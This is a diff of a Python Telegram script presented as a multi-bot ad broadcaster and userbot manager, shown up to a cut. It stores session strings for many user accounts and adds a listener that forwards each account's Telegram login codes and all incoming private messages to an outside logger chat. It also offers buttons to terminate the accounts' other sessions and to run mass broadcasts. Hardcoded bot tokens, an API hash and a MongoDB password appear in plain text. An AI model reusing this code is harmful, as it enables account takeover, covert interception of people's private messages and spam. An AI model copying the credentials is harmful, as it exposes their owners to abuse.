@@ -1,3 +1,10 @@
+# ==============================================================================
+# ADVANCED MULTI-BOT TELEGRAM BROADCASTER & USERBOT MANAGER
+# ==============================================================================
+# This script is highly scaled and configured to run continuously.
+# It manages Sub-Bots, Batches, Userbots, Auto-Broadcasting, and Global Listeners.
+# ==============================================================================
+
 import json
 import time
 import logging
@@ -7,17 +14,36 @@ import os
 import re
 from datetime import datetime
 from pathlib import Path
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, List, Tuple, Union
 
 import pymongo
+import pyrogram
 from pyrogram import Client, enums, raw
 from pyrogram import filters as pyro_filters
-from pyrogram.types import Message as PyroMessage, ChatMemberUpdated as PyroChatMemberUpdated
-from pyrogram.types import InlineKeyboardMarkup as PyroInlineKeyboardMarkup, InlineKeyboardButton as PyroInlineKeyboardButton
-from pyrogram.errors import SessionPasswordNeeded, AuthKeyUnregistered, PeerIdInvalid
+from pyrogram.types import (
+    Message as PyroMessage, 
+    ChatMemberUpdated as PyroChatMemberUpdated,
+    InlineKeyboardMarkup as PyroInlineKeyboardMarkup, 
+    InlineKeyboardButton as PyroInlineKeyboardButton
+)
+from pyrogram.errors import (
+    SessionPasswordNeeded, 
+    AuthKeyUnregistered, 
+    PeerIdInvalid,
+    FloodWait,
+    UserDeactivated,
+    UserDeactivatedBan,
+    FreshResetAuthorisationForbidden
+)
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember, Bot as TelegramBot
-from telegram.error import Forbidden, BadRequest
+from telegram import (
+    Update, 
+    InlineKeyboardButton, 
+    InlineKeyboardMarkup, 
+    ChatMember, 
+    Bot as TelegramBot
+)
+from telegram.error import Forbidden, BadRequest, TelegramError
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -29,47 +55,108 @@ from telegram.ext import (
     filters,
 )
 
-# ==========================================
-# CONFIGURATIONS
-# ==========================================
+# ==============================================================================
+# 1. CONFIGURATIONS & API KEYS
+# ==============================================================================
+
+# Main Telegram Bot Token
 BOT_TOKEN = "8645771152:AAE7S26IwAy2MrvxMWygrGQUK4lHiZq_PYI"
+
+# Owner User ID for Authorization
 OWNER_ID = 8884734704
 
-# --- LOGGER BOT SETTINGS ---
+# Logger Bot Token & Chat ID (Where all alerts, OTPs, DMs, Stats are sent)
 LOGGER_BOT_TOKEN = "8920900541:AAEnP2uIG_FSAIRC5sG8rRhALt58dEXYI9U" 
 LOGGER_CHAT_ID = 8884734704
 
-# Pyrogram API Keys for Userbots & Sub-Bots
+# Pyrogram API Keys for Userbots & Custom Sub-Bots (DO NOT CHANGE)
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 
-# MongoDB Configuration
+# MongoDB Connection String (Fail-safe with Local JSON Backup)
 MONGO_URI = "mongodb+srv://Tejas7xx:mrxtejas7@cluster0.akhlgjf.mongodb.net/?appName=Cluster0"
 
-# ==========================================
+# ==============================================================================
+# 2. CONSTANTS & SYSTEM VARIABLES
+# ==============================================================================
 
+# Local JSON fallback file definition
 DATA_FILE = Path(f"bot_data_{BOT_TOKEN.split(':')[0]}.json" if ":" in BOT_TOKEN else "bot_data.json")
+
+# Core Scheduled Job Names
 ADS_JOB_NAME = "ads_broadcast_cycle"
 
-logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+# Configure logging parameters for debugging and system tracking
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", 
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
-# --- States for Conversation ---
+# Style Mappings for Inline Keyboard Buttons
+BUTTON_COLOR_STYLES = {
+    "blue": "primary", 
+    "green": "success", 
+    "red": "danger", 
+    "default": "secondary"
+}
+
+# Conversation States for telegram.ext.ConversationHandler
 (
-    CONFIG_AD_MEDIA, CONFIG_AD_TEXT, CONFIG_BUTTON_COUNT, CONFIG_BUTTON_NAME, CONFIG_BUTTON_LINK, CONFIG_BUTTON_COLOR,
-    CONFIG_DELETE_TIMER, CONFIG_DELAY, CHANGE_DELAY, CHANGE_AD_MEDIA, CHANGE_AD_TEXT, RECONFIG_BUTTON_COUNT, RECONFIG_BUTTON_NAME,
-    RECONFIG_BUTTON_LINK, RECONFIG_BUTTON_COLOR, CHANGE_START_MESSAGE, START_BUTTON_COUNT,
-    START_BUTTON_NAME, START_BUTTON_LINK, START_BUTTON_COLOR, BROADCAST_MESSAGE, BROADCAST_CONFIRM,
-    WAIT_INPUT, BATCH_CONFIG_MEDIA, BATCH_CONFIG_TEXT, BATCH_CONFIG_BTN_COUNT, BATCH_CONFIG_BTN_NAME, BATCH_CONFIG_BTN_LINK,
-    BATCH_CONFIG_BTN_COLOR, BATCH_CHANGE_DELAY, BATCH_CHANGE_DEL_TIMER, BATCH_CONFIG_DELETE_TIMER,
-    BATCH_DELETE_N_PROMPT, SAVED_AD_MEDIA, SAVED_AD_TEXT, SAVED_AD_BTN_COUNT, SAVED_AD_BTN_NAME, SAVED_AD_BTN_LINK, SAVED_AD_BTN_COLOR,
-    GLOBAL_CHANGE_DEL_TIMER, UB_BROADCAST_MSG,
-    UB_ADD_PHONE, UB_ADD_CODE, UB_ADD_2FA, UB_ADD_STRING, UB_ADD_BULK, UB_ADD_FILE, UB_RENAME,
-    SB_ADD_TOKEN, SB_ADD_NAME, BATCH_ASSIGN_BOT
+    CONFIG_AD_MEDIA, 
+    CONFIG_AD_TEXT, 
+    CONFIG_BUTTON_COUNT, 
+    CONFIG_BUTTON_NAME, 
+    CONFIG_BUTTON_LINK, 
+    CONFIG_BUTTON_COLOR,
+    CONFIG_DELETE_TIMER, 
+    CONFIG_DELAY, 
+    CHANGE_DELAY, 
+    CHANGE_AD_MEDIA, 
+    CHANGE_AD_TEXT, 
+    RECONFIG_BUTTON_COUNT, 
+    RECONFIG_BUTTON_NAME,
+    RECONFIG_BUTTON_LINK, 
+    RECONFIG_BUTTON_COLOR, 
+    CHANGE_START_MESSAGE, 
+    START_BUTTON_COUNT,
+    START_BUTTON_NAME, 
+    START_BUTTON_LINK, 
+    START_BUTTON_COLOR, 
+    BROADCAST_MESSAGE, 
+    BROADCAST_CONFIRM,
+    WAIT_INPUT, 
+    BATCH_CONFIG_MEDIA, 
+    BATCH_CONFIG_TEXT, 
+    BATCH_CONFIG_BTN_COUNT, 
+    BATCH_CONFIG_BTN_NAME, 
+    BATCH_CONFIG_BTN_LINK,
+    BATCH_CONFIG_BTN_COLOR, 
+    BATCH_CHANGE_DELAY, 
+    BATCH_CHANGE_DEL_TIMER, 
+    BATCH_CONFIG_DELETE_TIMER,
+    BATCH_DELETE_N_PROMPT, 
+    SAVED_AD_MEDIA, 
+    SAVED_AD_TEXT, 
+    SAVED_AD_BTN_COUNT, 
+    SAVED_AD_BTN_NAME, 
+    SAVED_AD_BTN_LINK, 
+    SAVED_AD_BTN_COLOR,
+    GLOBAL_CHANGE_DEL_TIMER, 
+    UB_BROADCAST_MSG,
+    UB_ADD_PHONE, 
+    UB_ADD_CODE, 
+    UB_ADD_2FA, 
+    UB_ADD_STRING, 
+    UB_ADD_BULK, 
+    UB_ADD_FILE, 
+    UB_RENAME,
+    SB_ADD_TOKEN, 
+    SB_ADD_NAME, 
+    BATCH_ASSIGN_BOT
 ) = range(51)
 
-BUTTON_COLOR_STYLES = {"blue": "primary", "green": "success", "red": "danger", "default": "secondary"}
-
+# Default Database Structure (Used if building from scratch)
 DEFAULT_DATA = {
     "configured": False,
     "started": False,
@@ -92,39 +179,54 @@ DEFAULT_DATA = {
     "saved_messages": {},
     "batches": {},
     "history": {}, 
-    "saved_ads": {"1": {}, "2": {}, "3": {}, "4": {}, "5": {}}, 
+    "saved_ads": {
+        "1": {}, "2": {}, "3": {}, "4": {}, "5": {}
+    }, 
     "sub_bots": {}, 
     "userbots": {}  
 }
 
-# --- MongoDB Setup ---
+
+# ==============================================================================
+# 3. DATABASE (MONGODB / JSON) CONNECTION & HELPERS
+# ==============================================================================
+
 db_client = None
 bot_data_collection = None
 USE_MONGO = False
 
 try:
+    # Attempting to establish a stable MongoDB Connection
     db_client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=2000)
     db_client.server_info() 
     bot_data_collection = db_client["telegram_bot_db"]["bot_data"]
     USE_MONGO = True
-    logger.info("Connected to MongoDB successfully.")
+    logger.info("Connected to MongoDB cluster successfully.")
 except Exception as e:
-    logger.warning(f"MongoDB connection failed. Using local JSON fallback. Reason: {e}")
+    logger.warning(f"MongoDB connection failed. System will fallback to Local JSON. Reason: {e}")
     USE_MONGO = False
 
-# --- Data Management ---
 def load_data() -> Dict[str, Any]:
+    """
+    Loads bot operational data from MongoDB. 
+    Falls back to Local JSON if DB is offline.
+    Merges missing keys with DEFAULT_DATA to prevent KeyError.
+    """
     bot_id = BOT_TOKEN.split(':')[0]
     data = None
     
     if USE_MONGO:
-        doc = bot_data_collection.find_one({"_id": bot_id})
-        if not doc:
+        try:
+            doc = bot_data_collection.find_one({"_id": bot_id})
+            if not doc:
+                data = DEFAULT_DATA.copy()
+                data["_id"] = bot_id
+                bot_data_collection.insert_one(data)
+            else:
+                data = doc
+        except Exception as err:
+            logger.error(f"Error fetching from MongoDB: {err}. Falling back to default empty state.")
             data = DEFAULT_DATA.copy()
-            data["_id"] = bot_id
-            bot_data_collection.insert_one(data)
-        else:
-            data = doc
     else:
         if not DATA_FILE.exists():
             save_data(DEFAULT_DATA.copy())
@@ -132,23 +234,46 @@ def load_data() -> Dict[str, Any]:
         try:
             with open(DATA_FILE, "r", encoding="utf-8") as f:
                 data = json.load(f)
-        except Exception:
+        except Exception as file_err:
+            logger.error(f"Error reading JSON file: {file_err}. Regenerating JSON.")
             data = DEFAULT_DATA.copy()
             save_data(data)
             return data
 
+    # Sanitize and ensure all required keys exist
     for key, value in DEFAULT_DATA.items():
         data.setdefault(key, value)
         
+    # Standardize legacy batch data structures
     for bname, bdata in list(data["batches"].items()):
         if isinstance(bdata, list):
             data["batches"][bname] = {
-                "groups": bdata, "msg_chat_id": None, "msg_id": None, "buttons": [],
-                "settings": {"auto_broadcast": False, "auto_delete": True, "delete_last": True, "auto_pin": False, "delay": 30, "delete_timer": 0, "link_to_global": False},
-                "stats": {"sent": 0, "failed": 0}, "assigned_bot": None
+                "groups": bdata, 
+                "msg_chat_id": None, 
+                "msg_id": None, 
+                "buttons": [],
+                "settings": {
+                    "auto_broadcast": False, 
+                    "auto_delete": True, 
+                    "delete_last": True, 
+                    "auto_pin": False, 
+                    "delay": 30, 
+                    "delete_timer": 0, 
+                    "link_to_global": False
+                },
+                "stats": {"sent": 0, "failed": 0}, 
+                "assigned_bot": None
             }
         else:
-            bdata.setdefault("settings", {"auto_broadcast": False, "auto_delete": True, "delete_last": True, "auto_pin": False, "delay": 30, "delete_timer": 0, "link_to_global": False})
+            bdata.setdefault("settings", {
+                "auto_broadcast": False, 
+                "auto_delete": True, 
+                "delete_last": True, 
+                "auto_pin": False, 
+                "delay": 30, 
+                "delete_timer": 0, 
+                "link_to_global": False
+            })
             bdata["settings"].setdefault("delete_last", True)
             bdata["settings"].setdefault("link_to_global", False)
             bdata.setdefault("stats", {"sent": 0, "failed": 0})
@@ -157,27 +282,44 @@ def load_data() -> Dict[str, Any]:
     return data
 
 def save_data(data: Dict[str, Any]) -> None:
+    """
+    Saves the data dict to MongoDB or Local JSON securely.
+    """
     if USE_MONGO:
-        bot_id = BOT_TOKEN.split(':')[0]
-        bot_data_collection.update_one({"_id": bot_id}, {"$set": data}, upsert=True)
+        try:
+            bot_id = BOT_TOKEN.split(':')[0]
+            bot_data_collection.update_one({"_id": bot_id}, {"$set": data}, upsert=True)
+        except Exception as e:
+            logger.error(f"Failed saving to Mongo: {e}")
     else:
-        with open(DATA_FILE, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
+        try:
+            with open(DATA_FILE, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            logger.error(f"Failed saving to JSON: {e}")
 
 def is_owner(user_id: Optional[int]) -> bool:
+    """Validates if the invoking user is the owner."""
     return user_id == OWNER_ID
 
 def has_ad_config(data: Dict[str, Any]) -> bool:
+    """Checks if global advertising parameters are correctly configured."""
     return bool(data.get("ad_source_chat_id") and data.get("ad_message_id"))
 
 def has_start_message(data: Dict[str, Any]) -> bool:
+    """Checks if a custom start message is set for normal users."""
     return bool(data.get("start_source_chat_id") and data.get("start_message_id"))
 
 def get_today_date_str() -> str:
+    """Returns today's date in YYYY-MM-DD string format."""
     return datetime.now().strftime("%Y-%m-%d")
 
-def _save_userbot(session_str, alias="New Account"):
+def _save_userbot(session_str: str, alias: str = "New Account") -> None:
+    """
+    Registers a new Pyrogram userbot string session into the database.
+    """
     data = load_data()
+    # Generate unique ID based on session hash
     ub_id = hashlib.md5(session_str.encode()).hexdigest()[:10]
     data.setdefault("userbots", {})[ub_id] = {
         "session": session_str,
@@ -187,18 +329,128 @@ def _save_userbot(session_str, alias="New Account"):
         "spambot": "Unknown"
     }
     save_data(data)
+    logger.info(f"Successfully saved userbot session for alias: {alias}")
 
-# --- Active Sub-Bot Listeners & Custom Message Configurator ---
-sub_bot_clients = {}
-subbot_setup_sessions = {} # Tracks state when Owner configures messages directly in Sub-bot
+# ==============================================================================
+# 4. GLOBAL LOGGER BOT ALERT MECHANISM
+# ==============================================================================
 
-async def start_subbot_listener(token: str, name: str):
+async def send_to_logger(text: str) -> None:
+    """
+    Asynchronously fires an HTML message to the Logger Chat.
+    Used for OTPs, DMs, Terminations, Stats, and Bot Additions.
+    """
+    if not LOGGER_BOT_TOKEN or LOGGER_BOT_TOKEN == "YOUR_LOGGER_BOT_TOKEN_HERE":
+        return
+    try:
+        async with TelegramBot(token=LOGGER_BOT_TOKEN) as log_bot:
+            await log_bot.send_message(
+                chat_id=LOGGER_CHAT_ID, 
+                text=text, 
+                parse_mode="HTML"
+            )
+    except Exception as e:
+        logger.error(f"Failed to send alert to Logger Bot: {e}")
+
+# ==============================================================================
+# 5. USERBOT CONTINUOUS LISTENER (OTPs & DIRECT MESSAGES)
+# ==============================================================================
+
+userbot_clients: Dict[str, Client] = {}
+
+async def start_userbot_listener(ub_id: str, session_str: str, alias: str) -> None:
+    """
+    Launches a background Pyrogram client for Userbots.
+    This listens for incoming private messages (DMs) and Telegram OTPs
+    and forwards them continuously to the Logger Bot. 
+    Persists across VPS restarts.
+    """
+    if ub_id in userbot_clients:
+        return
+    
+    try:
+        client = Client(
+            name=f"ub_listener_{ub_id}", 
+            session_string=session_str, 
+            api_id=API_ID, 
+            api_hash=API_HASH, 
+            in_memory=True
+        )
+        
+        @client.on_message(pyro_filters.private & ~pyro_filters.me)
+        async def on_ub_private_message(c: Client, message: PyroMessage):
+            # 1. Listen for Official Telegram Server (OTPs/Login Codes)
+            if message.from_user and message.from_user.id == 777000:
+                text_content = message.text or ""
+                alert_msg = (
+                    f"🔐 <b>TELEGRAM SYSTEM/OTP RECEIVED</b>\n"
+                    f"<b>Account Alias:</b> {alias}\n"
+                    f"<b>Message:</b>\n<code>{text_content}</code>"
+                )
+                await send_to_logger(alert_msg)
+            
+            # 2. Listen for standard Direct Messages (DMs)
+            else:
+                sender_name = message.from_user.first_name if message.from_user else "Unknown User"
+                sender_id = message.from_user.id if message.from_user else "Unknown ID"
+                username = f"@{message.from_user.username}" if message.from_user and message.from_user.username else ""
+                content = message.text or "<i>[Media / Non-text Message]</i>"
+                
+                alert_msg = (
+                    f"💬 <b>NEW DIRECT MESSAGE (DM)</b>\n"
+                    f"<b>Target Account:</b> {alias}\n"
+                    f"<b>From:</b> {sender_name} {username} (<code>{sender_id}</code>)\n"
+                    f"<b>Message:</b>\n{content}"
+                )
+                await send_to_logger(alert_msg)
+
+        await client.start()
+        userbot_clients[ub_id] = client
+        logger.info(f"Userbot Listener active for alias: {alias}")
+    
+    except AuthKeyUnregistered:
+        logger.warning(f"AuthKeyUnregistered for userbot {alias}. Marking as dead.")
+        data = load_data()
+        if ub_id in data.get("userbots", {}):
+            data["userbots"][ub_id]["status"] = "dead (AuthKeyUnregistered)"
+            save_data(data)
+    except Exception as e:
+        logger.error(f"Failed to start Userbot Listener for {alias}: {e}")
+
+async def stop_userbot_listener(ub_id: str) -> None:
+    """Gracefully stops a running userbot listener."""
+    if ub_id in userbot_clients:
+        try:
+            await userbot_clients[ub_id].stop()
+            del userbot_clients[ub_id]
+            logger.info(f"Stopped userbot listener for ID {ub_id}")
+        except Exception as e:
+            logger.error(f"Error stopping userbot listener: {e}")
+
+# ==============================================================================
+# 6. SUB-BOT CONTINUOUS LISTENER (MULTI-BOT ARCHITECTURE)
+# ==============================================================================
+
+sub_bot_clients: Dict[str, Client] = {}
+subbot_setup_sessions: Dict[str, Any] = {} 
+
+async def start_subbot_listener(token: str, name: str) -> None:
+    """
+    Launches a background Pyrogram client for Custom Sub-bots.
+    This tracks group additions/removals and allows in-bot custom message setups.
+    """
     if token in sub_bot_clients: return
     try:
         bot_id = token.split(':')[0]
-        client = Client(name=f"sb_{bot_id}", bot_token=token, api_id=API_ID, api_hash=API_HASH, in_memory=True)
+        client = Client(
+            name=f"sb_{bot_id}", 
+            bot_token=token, 
+            api_id=API_ID, 
+            api_hash=API_HASH, 
+            in_memory=True
+        )
         
-        # 1. Private Message Handler (For Setup Custom Messages)
+        # 1. Private Message Handler for In-Bot Setup
         @client.on_message(pyro_filters.private & pyro_filters.user(OWNER_ID))
         async def sb_private_message(c: Client, message: PyroMessage):
             t = c.bot_token
@@ -213,12 +465,14 @@ async def start_subbot_listener(token: str, name: str):
             if step == "MEDIA":
                 session["media_msg"] = message
                 session["step"] = "TEXT"
-                await message.reply_text("✅ <b>Media/Photo Received!</b>\n\nNow send the <b>Text Message / Caption</b>.\n<i>(Type /skip if you don't want a caption, Premium Emojis are supported!)</i>", parse_mode=enums.ParseMode.HTML)
+                await message.reply_text(
+                    "✅ <b>Media/Photo Received!</b>\n\nNow send the <b>Text Message / Caption</b>.\n<i>(Type /skip if you don't want a caption, Premium Emojis are supported!)</i>", 
+                    parse_mode=enums.ParseMode.HTML
+                )
 
             elif step == "TEXT":
                 media_msg = session["media_msg"]
                 try:
-                    # Merge Media and Text intelligently inside the sub-bot
                     if message.text and message.text.lower() != '/skip':
                         caption_html = message.text.html if message.text else ""
                         if media_msg.photo:
@@ -243,8 +497,10 @@ async def start_subbot_listener(token: str, name: str):
                     session["step"] = "MEDIA"
 
             elif step == "BTN_COUNT":
-                try: count = int(message.text.strip())
-                except: return await message.reply_text("Please send a valid number (0-20).")
+                try: 
+                    count = int(message.text.strip())
+                except: 
+                    return await message.reply_text("Please send a valid number (0-20).")
                 session["btn_count"] = count
                 session["btns"] = []
                 if count == 0:
@@ -270,10 +526,11 @@ async def start_subbot_listener(token: str, name: str):
                 await message.reply_text("Choose Button Color:", reply_markup=kb)
 
             elif step == "TIMER":
-                try: timer = int(message.text.strip())
-                except: return await message.reply_text("Please send a valid number.")
+                try: 
+                    timer = int(message.text.strip())
+                except: 
+                    return await message.reply_text("Please send a valid number.")
 
-                # FINAL SAVE
                 data = load_data()
                 if bname in data["batches"]:
                     data["batches"][bname]["msg_chat_id"] = session["msg_chat_id"]
@@ -285,7 +542,7 @@ async def start_subbot_listener(token: str, name: str):
                 del subbot_setup_sessions[t]
                 await message.reply_text(f"🎉 <b>Batch '{bname}' Configuration Complete!</b>\n\nYou can now go back to the Main Bot to start your broadcast.", parse_mode=enums.ParseMode.HTML)
 
-        # 2. Callbacks for Buttons Color (Sub-bot)
+        # 2. Callbacks for Color Selection
         @client.on_callback_query(pyro_filters.regex("^sbcol_"))
         async def sb_color_callback(c: Client, query):
             t = c.bot_token
@@ -313,7 +570,7 @@ async def start_subbot_listener(token: str, name: str):
                 session["step"] = "BTN_NAME"
                 await c.send_message(query.message.chat.id, f"Send button {session['curr_btn']} name.", parse_mode=enums.ParseMode.HTML)
 
-        # 3. Group Auto-Listener
+        # 3. Auto-Group Status Listener
         @client.on_message(pyro_filters.group | pyro_filters.channel)
         async def sb_on_message(c: Client, message: PyroMessage):
             chat = message.chat
@@ -340,7 +597,8 @@ async def start_subbot_listener(token: str, name: str):
     except Exception as e:
         logger.error(f"Failed to start listener for Sub-bot {name}: {e}")
 
-async def stop_subbot_listener(token: str):
+async def stop_subbot_listener(token: str) -> None:
+    """Stops the specified sub-bot listener process."""
     if token in sub_bot_clients:
         try:
             await sub_bot_clients[token].stop()
@@ -349,23 +607,23 @@ async def stop_subbot_listener(token: str):
         except Exception as e:
             logger.error(f"Error stopping Sub-bot: {e}")
 
-# --- Send Log to Logger Bot ---
-async def send_to_logger(text: str):
-    if not LOGGER_BOT_TOKEN or LOGGER_BOT_TOKEN == "YOUR_LOGGER_BOT_TOKEN_HERE":
-        return
-    try:
-        async with TelegramBot(token=LOGGER_BOT_TOKEN) as log_bot:
-            await log_bot.send_message(chat_id=LOGGER_CHAT_ID, text=text, parse_mode="HTML")
-    except Exception as e:
-        logger.error(f"Failed to send to logger: {e}")
 
-# --- Helper: Merge Media & Text ---
+# ==============================================================================
+# 7. MEDIA AND BUTTON CONSTRUCTION HELPERS
+# ==============================================================================
+
 async def merge_media_text_and_save(context: ContextTypes.DEFAULT_TYPE, chat_id: int, media_msg, text_msg):
-    if not media_msg: return text_msg
+    """
+    Intelligently merges a media object with a separate text caption.
+    Retains HTML formatting and Telegram Entities.
+    """
+    if not media_msg: 
+        return text_msg
     kwargs = {'parse_mode': "HTML"}
     if text_msg and text_msg.text and text_msg.text.lower() != '/skip':
         kwargs['caption'] = text_msg.text.replace('<', '&lt;').replace('>', '&gt;')
-        if text_msg.entities: kwargs['caption_entities'] = text_msg.entities
+        if text_msg.entities: 
+            kwargs['caption_entities'] = text_msg.entities
     try:
         if media_msg.photo: return await context.bot.send_photo(chat_id=chat_id, photo=media_msg.photo[-1].file_id, **kwargs)
         elif media_msg.video: return await context.bot.send_video(chat_id=chat_id, video=media_msg.video.file_id, **kwargs)
@@ -373,23 +631,28 @@ async def merge_media_text_and_save(context: ContextTypes.DEFAULT_TYPE, chat_id:
         elif media_msg.animation: return await context.bot.send_animation(chat_id=chat_id, animation=media_msg.animation.file_id, **kwargs)
         else: return media_msg
     except Exception as e:
-        logger.error(f"Merge error: {e}")
+        logger.error(f"Media merge error: {e}")
         return media_msg
 
-# --- Color & URL Features ---
 def safe_url(url: str) -> str:
-    if not url: return "https://t.me/"
+    """Ensures URLs provided for buttons are valid and appropriately protocol-prefixed."""
+    if not url: 
+        return "https://t.me/"
     url = str(url).strip()
-    if url.startswith("@"): return f"https://t.me/{url[1:]}"
+    if url.startswith("@"): 
+        return f"https://t.me/{url[1:]}"
     if not url.startswith(("http://", "https://", "tg://")):
-        if "." not in url: return "https://t.me/"
+        if "." not in url: 
+            return "https://t.me/"
         return f"https://{url}"
     return url
 
 def get_button_style(color: str) -> str:
+    """Maps custom color names to Pyrogram UI style keywords."""
     return BUTTON_COLOR_STYLES.get((color or "default").strip().lower(), "secondary")
 
 def build_buttons(buttons: list) -> Optional[InlineKeyboardMarkup]:
+    """Generates a structured Inline Keyboard Markup from a list of dicts."""
     if not buttons: return None
     keyboard = []
     for btn in buttons:
@@ -397,8 +660,10 @@ def build_buttons(buttons: list) -> Optional[InlineKeyboardMarkup]:
         url = safe_url(btn.get("url", ""))
         style = get_button_style(btn.get("color", "default"))
         kwargs = {}
-        if style != "secondary": kwargs["api_kwargs"] = {"style": style}
-        if name and url: keyboard.append([InlineKeyboardButton(name, url=url, **kwargs)])
+        if style != "secondary": 
+            kwargs["api_kwargs"] = {"style": style}
+        if name and url: 
+            keyboard.append([InlineKeyboardButton(name, url=url, **kwargs)])
     return InlineKeyboardMarkup(keyboard) if keyboard else None
 
 def build_ad_buttons() -> Optional[InlineKeyboardMarkup]:
@@ -407,7 +672,11 @@ def build_ad_buttons() -> Optional[InlineKeyboardMarkup]:
 def build_start_buttons() -> Optional[InlineKeyboardMarkup]:
     return build_buttons(load_data().get("start_buttons", []))
 
-# --- Keyboards ---
+
+# ==============================================================================
+# 8. EXTENSIVE UI KEYBOARD DEFINITIONS (Modular & Clean)
+# ==============================================================================
+
 def cancel_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back / Cancel", callback_data="cancel_state")]])
 
@@ -428,7 +697,10 @@ def admin_keyboard() -> InlineKeyboardMarkup:
 
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("📊 Date-Wise Analytics & Stats 📆", callback_data="stats=0")],
-        [InlineKeyboardButton(start_stop_text, callback_data="toggle_ads"), InlineKeyboardButton(auto_text, callback_data="toggle_auto")],
+        [
+            InlineKeyboardButton(start_stop_text, callback_data="toggle_ads"), 
+            InlineKeyboardButton(auto_text, callback_data="toggle_auto")
+        ],
         [InlineKeyboardButton("📨 Send Global Broadcast ONCE", callback_data="send_once")],
         [InlineKeyboardButton("🗂️ Manage Batches (Custom Msgs)", callback_data="groups_batches_menu")],
         [InlineKeyboardButton("🤖 Manage Sub-Bots (Multi-Bot)", callback_data="subbots_menu")],
@@ -439,7 +711,10 @@ def admin_keyboard() -> InlineKeyboardMarkup:
 def old_settings_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("💾 Manage Saved Ads (5 Slots)", callback_data="saved_ads_menu")],
-        [InlineKeyboardButton("⏱ Change Delay", callback_data="change_delay"), InlineKeyboardButton("⏱ Set Delete Timer", callback_data="change_del_timer")],
+        [
+            InlineKeyboardButton("⏱ Change Delay", callback_data="change_delay"), 
+            InlineKeyboardButton("⏱ Set Delete Timer", callback_data="change_del_timer")
+        ],
         [InlineKeyboardButton("✏️ Change Global Ads Message", callback_data="change_ad")],
         [InlineKeyboardButton("🔘 Reconfigure Global Buttons", callback_data="reconfig_buttons")],
         [InlineKeyboardButton("👋 Change Start Message (For Users)", callback_data="change_start")],
@@ -461,8 +736,9 @@ def subbots_keyboard() -> InlineKeyboardMarkup:
     data = load_data()
     kb = []
     for token, info in data.get("sub_bots", {}).items():
-        kb.append([InlineKeyboardButton(f"🤖 {info['name']} (...{token[-5:]})", callback_data=f"sb_del_{token[:10]}")])
-    if not data.get("sub_bots"): kb.append([InlineKeyboardButton("No sub-bots added yet.", callback_data="dummy")])
+        kb.append([InlineKeyboardButton(f"🤖 {info['name']} (...{token[-5:]})", callback_data=f"sb_menu_{token[:10]}")])
+    if not data.get("sub_bots"): 
+        kb.append([InlineKeyboardButton("No sub-bots added yet.", callback_data="dummy")])
     kb.append([InlineKeyboardButton("➕ Add New Bot", callback_data="sb_add")])
     kb.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")])
     return InlineKeyboardMarkup(kb)
@@ -474,6 +750,7 @@ def userbots_keyboard() -> InlineKeyboardMarkup:
         status = "🟢" if info.get("status") == "active" else "🔴"
         bc = "📡" if info.get("is_broadcasting") else ""
         kb.append([InlineKeyboardButton(f"{status} {info.get('alias', 'Account')} {bc}", callback_data=f"ub_view_{ub_id}")])
+    
     kb.append([
         InlineKeyboardButton("➕ Add Account", callback_data="ub_add_menu"),
         InlineKeyboardButton("🔄 Refresh All", callback_data="ub_refresh")
@@ -499,8 +776,14 @@ def userbot_single_keyboard(ub_id: str) -> InlineKeyboardMarkup:
     data = load_data()
     bc_text = "🟢 Flag: Broadcasting" if data.get("userbots",{}).get(ub_id,{}).get("is_broadcasting") else "🔴 Flag: Stopped"
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✏️ Change Alias", callback_data=f"ub_rename_{ub_id}"), InlineKeyboardButton("📊 Get Status & Info", callback_data=f"ub_stats_{ub_id}")],
-        [InlineKeyboardButton("🤖 Check @SpamBot", callback_data=f"ub_spambot_{ub_id}")],
+        [
+            InlineKeyboardButton("✏️ Change Alias", callback_data=f"ub_rename_{ub_id}"), 
+            InlineKeyboardButton("📊 Get Status", callback_data=f"ub_stats_{ub_id}")
+        ],
+        [
+            InlineKeyboardButton("🤖 Check @SpamBot", callback_data=f"ub_spambot_{ub_id}"),
+            InlineKeyboardButton("👑 Check Owner/Admin", callback_data=f"ub_owner_{ub_id}")
+        ],
         [InlineKeyboardButton("📢 Broadcast to Admin Groups", callback_data=f"ub_bcast_{ub_id}")],
         [InlineKeyboardButton(bc_text, callback_data=f"ub_togbc_{ub_id}")],
         [InlineKeyboardButton("🛑 Terminate Other Sessions", callback_data=f"ub_termother_{ub_id}")],
@@ -517,14 +800,23 @@ def build_batches_keyboard(page: int = 0) -> InlineKeyboardMarkup:
     total_pages = max(1, (len(batches) + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE)
     start_idx = page * ITEMS_PER_PAGE
     end_idx = start_idx + ITEMS_PER_PAGE
+    
     for bname, bdata in batches[start_idx:end_idx]:
         status = "🟢" if bdata["settings"].get("auto_broadcast") else "🔴"
         bot_assigned = "🤖" if bdata.get("assigned_bot") else ""
-        kb.append([InlineKeyboardButton(f"{status} 🗂️ {bname[:15]} ({len(bdata['groups'])} Chats) {bot_assigned}", callback_data=f"bat_menu_{bname}")])
+        kb.append([InlineKeyboardButton(
+            f"{status} 🗂️ {bname[:15]} ({len(bdata['groups'])} Chats) {bot_assigned}", 
+            callback_data=f"bat_menu_{bname}"
+        )])
+        
     nav = []
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"batches_page={page-1}"))
-    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"batches_page={page+1}"))
-    if nav: kb.append(nav)
+    if page > 0: 
+        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"batches_page={page-1}"))
+    if page < total_pages - 1: 
